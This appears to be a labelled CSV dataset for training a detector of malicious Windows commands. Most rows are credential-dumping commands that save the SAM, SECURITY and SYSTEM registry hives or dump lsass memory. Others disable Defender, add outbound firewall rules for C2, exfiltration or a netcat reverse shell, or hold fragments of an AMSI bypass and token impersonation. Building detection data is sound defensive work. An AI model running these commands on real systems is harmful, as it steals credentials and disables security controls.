text,label
reg save hklm\system c:\windows\temp\xxl5ua8y.save,1
reg export hklm\security c:\windows\temp\79fbzoxp.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\1gwhne4t.dat""",1
"cmd.exe /c ""get-help   adjusttokenprivileges   -full""",0
"cmd.exe /c ""cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\337q5j1i.dat""""",1
reg export hklm\system c:\windows\temp\7jgt388x.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\jw8s1zh0.dat""",1
"cmd.exe  /c  ""reg  save  hklm\sam  c:\temp\tretp0ad.dat""",1
reg save hklm\sam c:\windows\temp\ikl3507p.save,1
reg save hklm\system c:\windows\temp\74c9nkxi.save,1
reg save hklm\system c:\windows\temp\af5erhwu.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\ici7qtuk.dat""",1
"powershell -nop -c ""rule:  c2  beacon  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
reg   export   hklm\security   c:\windows\temp\07n4claq.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\c0ts2v84.dat""",1
"cmd.exe /c ""set-mppreference  -disablerealtimemonitoring  $true""",2
reg export hklm\sam c:\windows\temp\tijt5eql.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\u1tshjt0.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\5lkbay6g.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\4ztufgws.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\uz3dm00s.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\oa1fl0h0.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\dlwk2hun.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\jkgxkpe5.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\d5pwvwcy.dat""",1
"cmd.exe   /c   ""reg   export   hklm\security   c:\temp\y7d0mkb5.dat""",1
reg export hklm\sam c:\windows\temp\wo22xlgn.save,1
"powershell -nop -c ""$a = [ref].assembly.gettype('system.management.automation.amsiutils')""",3
"powershell -nop -c ""reg export hklm\sam c:\temp\jy4lmz03.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\6uni898s.dat""",1
reg save hklm\sam c:\windows\temp\mpod5x1a.save,1
reg save hklm\sam c:\windows\temp\8f0bd6ue.save,1
rule:   exfil   data   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888,2
reg export hklm\system c:\windows\temp\9bmu5pt1.save,1
reg export hklm\system c:\windows\temp\8q6zt9v1.save,1
reg export hklm\sam c:\windows\temp\1o77annh.save,1
reg save hklm\security c:\windows\temp\bkv0gn7a.save,1
reg save hklm\security c:\windows\temp\0h7039vm.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\5ygsl078.dat""",1
reg save hklm\system c:\windows\temp\0m8u2338.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\56thqo8i.dat""",1
reg export hklm\system c:\windows\temp\38hrttxo.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\n029lloc.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\vibl2dcm.dat""",1
reg export hklm\system c:\windows\temp\nag7kwls.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\ps9fkqe7.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\mbbkcw1c.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\e4ihdai9.dat""",1
"cmd.exe /c ""rule: exfil data | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 1337""",2
"cmd.exe /c ""reg save hklm\security c:\temp\qxkuftj4.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\mj6jpfk9.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\l09rhyjg.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\28jho2wf.dat""",1
reg save hklm\sam c:\windows\temp\x30rq2ck.save,1
reg export hklm\sam c:\windows\temp\2ovwi0gx.save,1
reg save hklm\sam c:\windows\temp\bm3vw6w0.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\rcnmzybl.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\zndsovjt.dat""",1
reg save hklm\security c:\windows\temp\2s1wbc34.save,1
rule:   exfil   data   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   1337,2
reg export hklm\system c:\windows\temp\uljuf8uw.save,1
reg save hklm\security c:\windows\temp\i48iz2te.save,1
reg export hklm\sam c:\windows\temp\2k5eu0b6.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\gnqdgpjs.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\zvp9gnzp.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\yufe27s4.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\as9if7sv.dat""",1
reg save hklm\system c:\windows\temp\qestwlco.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\455dzlw9.dat""",1
reg save hklm\security c:\windows\temp\4auz0ay1.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\ctso0ppe.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\tmydyryy.save""",1
"powershell -nop -c ""reg export hklm\security c:\temp\zedq3lun.dat""",1
"cmd.exe  /c  ""reg  export  hklm\security  c:\temp\5vsr5l98.dat""",1
reg export hklm\security c:\windows\temp\hh22qps1.save,1
reg export hklm\system c:\windows\temp\ovbd88ff.save,1
"powershell -nop -c ""whoami   /groups""",0
"powershell -nop -c ""reg export hklm\security c:\temp\qjs2t7gi.dat""",1
"powershell -nop -c ""sc   stop   windefend""",2
reg export hklm\system c:\windows\temp\lt1k9f8p.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\rjaivwgx.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\q1wzkq11.dat""",1
"cmd.exe /c ""reg save hklm\system c:\windows\temp\elm0g8vu.save""",1
reg save hklm\security c:\windows\temp\b3ee47mv.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\2wqfcm60.dat""",1
reg export hklm\security c:\windows\temp\8swyjmc4.save,1
"cmd.exe /c ""reg   save   hklm\security   c:\windows\temp\z9qtyiaq.save""",1
reg save hklm\system c:\windows\temp\3ax4q3dr.save,1
reg export hklm\sam c:\windows\temp\lh8s6wfd.save,1
"powershell -nop -c ""rule:   c2   beacon   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
reg  save  hklm\security  c:\windows\temp\f2bx8dzw.save,1
reg export hklm\sam c:\windows\temp\g0x7e3l3.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\fk8d2lys.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\hys3exc5.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\9w9z6m8d.dat""",1
reg  export  hklm\security  c:\windows\temp\3jb1pvty.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\36d7zp29.dat""",1
"powershell -nop -c ""$a  =  [ref].assembly.gettype('system.management.automation.openprocesstoken')""",3
"powershell -nop -c ""reg export hklm\security c:\temp\xqdjmy7b.dat""",1
reg save hklm\security c:\windows\temp\diyz7120.save,1
reg export hklm\system c:\windows\temp\ell4yx5s.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\r63ukuud.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\17riwtzk.dat""",1
"powershell  -nop  -c  ""reg  export  hklm\sam  c:\temp\1r20rnry.dat""",1
reg export hklm\system c:\windows\temp\x16zwd5b.save,1
reg save hklm\system c:\windows\temp\jw7q0oy1.save,1
reg save hklm\sam c:\windows\temp\mjblv5x5.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\knsyej2m.dat""",1
reg   save   hklm\security   c:\windows\temp\wyh6ewr9.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\178n20bm.dat""",1
"cmd.exe   /c   ""reg   save   hklm\sam   c:\temp\uxs2tr75.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\bdboyp0p.dat""",1
reg save hklm\system c:\windows\temp\c5k52jjn.save,1
reg export hklm\security c:\windows\temp\mmae1z5p.save,1
rule:   c2   beacon   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888,2
"powershell -nop -c ""reg save hklm\security c:\temp\aa14qvph.dat""",1
reg export hklm\sam c:\windows\temp\m999ygvs.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\q7q6bonn.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\q9no92hb.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\lowfeivf.dat""",1
reg   save   hklm\sam   c:\windows\temp\xns0i0qy.save,1
"cmd.exe /c ""reg  save  hklm\security  c:\windows\temp\retobh51.save""",1
"cmd.exe /c ""[dllimport(""advapi32.dll"")]  extern  bool  duplicatetokenex(...)""",3
reg export hklm\system c:\windows\temp\wt8k0vvn.save,1
"powershell -nop -c ""rule:   c2   beacon   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
"cmd.exe /c ""reg save hklm\sam c:\temp\c0fx9uav.dat""",1
"rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full",1
"powershell -nop -c ""reg save hklm\sam c:\temp\y1309h0z.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\rojuqjww.dat""",1
reg export hklm\system c:\windows\temp\9mxjsx8z.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\kt36f6ry.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\isqsvf1j.dat""",1
reg save hklm\system c:\windows\temp\evy3p2ji.save,1
reg save hklm\sam c:\windows\temp\s36kgjjd.save,1
reg save hklm\sam c:\windows\temp\vls2pd6v.save,1
"cmd.exe /c ""[dllimport(""advapi32.dll"")]  extern  bool  impersonateloggedonuser(...)""",3
reg export hklm\sam c:\windows\temp\luiguvab.save,1
reg save hklm\security c:\windows\temp\26olbyq3.save,1
reg save hklm\sam c:\windows\temp\29vyts7k.save,1
"cmd.exe   /c   ""reg   save   hklm\security   c:\temp\qyqnw8ba.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\2ozoyt3w.dat""",1
"cmd.exe /c ""reg  export  hklm\security  c:\windows\temp\l4246bne.save""",1
"powershell -nop -c ""reg save hklm\security c:\windows\temp\lewmoa7a.save""",1
reg export hklm\system c:\windows\temp\gzbwxj3e.save,1
reg save hklm\sam c:\windows\temp\l6bdunm2.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\4mpuek6u.dat""",1
reg save hklm\system c:\windows\temp\eyovm1hy.save,1
reg export hklm\security c:\windows\temp\f5q0lghs.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\79rjd8ju.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\pylkwj4s.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\2u6d73wm.dat""",1
reg save hklm\sam c:\windows\temp\nytnjpz7.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\n1hucsf1.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\wxulomxd.dat""",1
"cmd.exe /c ""reg   query   hkcu\console""",0
reg save hklm\security c:\windows\temp\adoing6h.save,1
reg save hklm\security c:\windows\temp\wwvmep8x.save,1
reg export hklm\security c:\windows\temp\dhjgcb7x.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\azeiu3fh.dat""",1
reg save hklm\security c:\windows\temp\xoals72e.save,1
"powershell -nop -c ""$a   =   [ref].assembly.gettype('system.management.automation.impersonateloggedonuser')""",3
reg export hklm\security c:\windows\temp\2dw6x8m3.save,1
"powershell -nop -c ""rule:  c2  beacon  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
"cmd.exe /c ""reg export hklm\security c:\temp\n2t360n2.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\qz3t2di7.dat""",1
"powershell -nop -c ""cmd.exe  /c  ""reg  save  hklm\security  c:\temp\3cy0zaas.dat""""",1
"cmd.exe /c ""$a  =  [ref].assembly.gettype('system.management.automation.duplicatetokenex')""",3
reg export hklm\system c:\windows\temp\z0cwkg0r.save,1
"powershell -nop -c ""cmd.exe   /c   ""reg   save   hklm\security   c:\temp\va3gkkud.dat""""",1
reg export hklm\system c:\windows\temp\ofpczapj.save,1
reg export hklm\system c:\windows\temp\33qe113v.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\5nvuu92q.dat""",1
reg  export  hklm\sam  c:\windows\temp\opwm3gin.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\bl2oym13.dat""",1
reg save hklm\sam c:\windows\temp\j3i12d9a.save,1
reg save hklm\system c:\windows\temp\9sifcgpt.save,1
"powershell -nop -c ""set-mppreference -disablerealtimemonitoring $true""",2
"cmd.exe /c ""reg save hklm\security c:\temp\nd7zvgjc.dat""",1
"cmd.exe /c ""$a   =   [ref].assembly.gettype('system.management.automation.impersonateloggedonuser')""",3
reg export hklm\system c:\windows\temp\um51verz.save,1
reg save hklm\security c:\windows\temp\qic66ig9.save,1
reg save hklm\system c:\windows\temp\f26p9d9q.save,1
"powershell -nop -c ""reg save hklm\security c:\windows\temp\bqjw4rru.save""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\7yoa0qwh.dat""",1
"powershell   -nop   -c   ""reg   save   hklm\security   c:\temp\071p5znd.dat""",1
reg save hklm\system c:\windows\temp\cp51xsb2.save,1
reg export hklm\sam c:\windows\temp\6kc9chj4.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\8gb1z6j4.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\2403sa22.dat""",1
reg save hklm\sam c:\windows\temp\5pwapgpd.save,1
reg save hklm\system c:\windows\temp\kj0j3n12.save,1
reg  export  hklm\system  c:\windows\temp\j4183sgv.save,1
reg save hklm\system c:\windows\temp\s0vlzg0r.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\xvdguo1r.dat""",1
reg export hklm\system c:\windows\temp\ioi6tc7u.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\l47lafc7.dat""",1
$a = [ref].assembly.gettype('system.management.automation.duplicatetokenex'),3
"powershell -nop -c ""rule:  exfil  data  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
"cmd.exe /c ""powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\101ls4ju.dat""""",1
"cmd.exe /c ""cmd.exe  /c  ""reg  export  hklm\sam  c:\temp\ricb9h5a.dat""""",1
reg export hklm\sam c:\windows\temp\3cjbt6ct.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\vjqk0ino.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\8zg8k8q1.dat""",1
reg export hklm\sam c:\windows\temp\yne13vdm.save,1
reg export hklm\sam c:\windows\temp\gghrtv9s.save,1
"cmd.exe /c ""get-help  adjusttokenprivileges  -full""",0
"powershell -nop -c ""reg save hklm\sam c:\temp\wvc2q3kt.dat""",1
reg save hklm\sam c:\windows\temp\0tg79lfn.save,1
reg save hklm\security c:\windows\temp\ubiimvmu.save,1
rule:  c2  beacon  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  4444,2
"powershell -nop -c ""reg save hklm\sam c:\temp\59auqwyr.dat""",1
reg save hklm\system c:\windows\temp\yaqzjblh.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\p45pkumj.dat""",1
"powershell -nop -c ""powershell   -nop   -c   ""reg   export   hklm\security   c:\temp\swzlop9x.dat""""",1
reg export hklm\system c:\windows\temp\mhjrt6o0.save,1
"cmd.exe /c ""reg export hklm\sam c:\windows\temp\d4qnjdk5.save""",1
"powershell -nop -c ""reg save hklm\security c:\temp\10lrdzfl.dat""",1
"powershell -nop -c ""rule: c2 beacon | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 4444""",2
"powershell -nop -c ""reg export hklm\sam c:\temp\i96ly9ev.dat""",1
reg export hklm\system c:\windows\temp\tgxg5tcn.save,1
reg export hklm\system c:\windows\temp\kd51r6hr.save,1
reg   export   hklm\sam   c:\windows\temp\ijoz15uh.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\6o15rvmq.dat""",1
reg save hklm\system c:\windows\temp\cx7s8yjp.save,1
reg save hklm\sam c:\windows\temp\wdknu84b.save,1
"powershell -nop -c ""reg export hklm\sam c:\temp\fl6iqvu8.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\unpkpfr3.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\3bisxfmx.dat""",1
reg export hklm\sam c:\windows\temp\56wfvyr8.save,1
reg save hklm\sam c:\windows\temp\u1m1f9mt.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\sd1hk5t9.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\windows\temp\c4xshrw9.save""",1
"cmd.exe /c ""rule:   c2   beacon   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
"cmd.exe /c ""rule:  exfil  data  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
"powershell -nop -c ""reg export hklm\sam c:\temp\68x1ezg4.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\s5bvzr3c.dat""",1
"cmd.exe /c ""reg save hklm\sam c:\temp\2v41h3rt.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\p1pl1b0h.dat""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\b25dwuso.dat""",1
"cmd.exe /c ""rule:  exfil  data  |  app:  c:\users\public\malware.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
"cmd.exe /c ""reg export hklm\security c:\temp\eogo69r7.dat""",1
reg save hklm\sam c:\windows\temp\ti9yzuy0.save,1
"powershell -nop -c ""reg save hklm\sam c:\temp\harlzdlo.dat""",1
reg save hklm\system c:\windows\temp\yfxmssga.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\r779q0nn.dat""",1
"cmd.exe /c ""rule: exfil data | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 1337""",2
"cmd.exe /c ""cmd.exe   /c   ""reg   save   hklm\security   c:\temp\p3akj44v.dat""""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\4qt4yu8m.dat""",1
reg save hklm\sam c:\windows\temp\fd4wpk10.save,1
"cmd.exe /c ""reg export hklm\security c:\temp\x24ejngl.dat""",1
"powershell -nop -c ""reg export hklm\security c:\temp\hr9kabw4.dat""",1
reg save hklm\security c:\windows\temp\4ghnc19u.save,1
reg export hklm\security c:\windows\temp\ltfc0x9s.save,1
"powershell -nop -c ""reg export hklm\security c:\windows\temp\6ht7rydh.save""",1
reg export hklm\sam c:\windows\temp\w5nl3zjn.save,1
reg export hklm\security c:\windows\temp\fe06sow0.save,1
reg export hklm\system c:\windows\temp\dffsho1u.save,1
"powershell -nop -c ""reg save hklm\security c:\temp\ivs8lkmm.dat""",1
reg export hklm\system c:\windows\temp\1psvvxsd.save,1
reg save hklm\security c:\windows\temp\7ensob6d.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\cw62caxa.dat""",1
"powershell -nop -c ""reg save hklm\sam c:\temp\s50j7lfr.dat""",1
reg export hklm\system c:\windows\temp\1xoz44f7.save,1
"cmd.exe /c ""reg save hklm\sam c:\temp\wqwuyfv5.dat""",1
"powershell -nop -c ""rule: c2 beacon | app: any | dir: outbound | act: allow | port: 1337""",2
reg export hklm\system c:\windows\temp\0t69ejqc.save,1
"cmd.exe /c ""rule:   exfil   data   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
"cmd.exe /c ""reg save hklm\sam c:\temp\5y29p243.dat""",1
reg save hklm\system c:\windows\temp\wnt3h8jv.save,1
"powershell -nop -c ""reg export hklm\security c:\temp\10kt1kf0.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\xnyu22at.dat""",1
"powershell -nop -c ""reg save hklm\security c:\temp\317vf5wj.dat""",1
reg export hklm\system c:\windows\temp\c9o2fqsa.save,1
"cmd.exe /c ""reg export hklm\sam c:\temp\sv8ifmd4.dat""",1
"powershell -nop -c ""reg export hklm\sam c:\temp\4u7g6aqq.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\fz02rt85.dat""",1
"powershell -nop -c ""powershell -nop -c ""reg export hklm\security c:\temp\srcyjvmc.dat""""",1
"cmd.exe /c ""reg export hklm\sam c:\temp\ktffylkq.dat""",1
"powershell -nop -c ""set-mppreference  -disablerealtimemonitoring  $true""",2
"powershell -nop -c ""reg save hklm\sam c:\temp\a13wejb7.dat""",1
"powershell  -nop  -c  ""reg  export  hklm\security  c:\temp\05ag5w09.dat""",1
"cmd.exe /c ""reg export hklm\security c:\temp\kaymipyp.dat""",1
"cmd.exe /c ""reg   export   hklm\system   c:\windows\temp\l91s1vyk.save""",1
"cmd.exe  /c  ""reg  save  hklm\security  c:\temp\mbkl2cx1.dat""",1
reg save hklm\system c:\windows\temp\8n904ha5.save,1
"cmd.exe /c ""reg save hklm\security c:\temp\1ia141fd.dat""",1
"cmd.exe /c ""reg save hklm\security c:\temp\y4zrpeu1.dat""",1
"cmd.exe   /c   ""reg   export   hklm\security   c:\temp\5gd29lg8.dat""",1
"powershell  -nop  -c  ""reg  save  hklm\security  c:\temp\tipbf4w5.dat""",1
rule: reverse shell | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 4444,2
